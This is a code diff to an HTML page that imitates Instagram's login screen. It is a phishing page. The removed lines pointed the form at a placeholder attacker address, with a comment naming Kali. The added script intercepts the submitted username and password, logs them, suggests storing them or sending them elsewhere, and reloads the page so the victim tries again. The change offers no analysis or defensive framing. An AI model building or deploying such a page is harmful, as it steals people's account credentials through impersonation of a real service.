@@ -232,8 +232,8 @@
       <div class="login-box">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" class="logo" alt="Instagram Logo">
 
-        <!-- FORMULARIO PARA ENVIAR DATOS A KALI -->
-        <form action="http://TU_IP_O_DOMINIO" method="POST">
+        <!-- FORMULARIO PARA CAPTURAR DATOS -->
+        <form id="loginForm">
           <div class="input-group">
             <input type="text" name="username" placeholder="Teléfono, usuario o correo electrónico" required>
           </div>
@@ -278,6 +278,27 @@
       <span>© 2025 Instagram from Meta</span>
     </div>
   </footer>
+
+  <!-- SCRIPT PARA CAPTURAR DATOS Y RECARGAR -->
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      event.preventDefault(); // Evita envío
+
+      const username = document.querySelector('input[name="username"]').value;
+      const password = document.querySelector('input[name="password"]').value;
+
+      console.log("Usuario:", username);
+      console.log("Contraseña:", password);
+
+      // Puedes hacer algo con los datos aquí antes de recargar
+      // Por ejemplo: guardarlos, enviarlos a otro lugar, etc.
+
+      // Recarga la página después de 1 segundo
+      setTimeout(() => {
+        location.reload();
+      }, 1000);
+    });
+  </script>
 
 </body>
 </html>
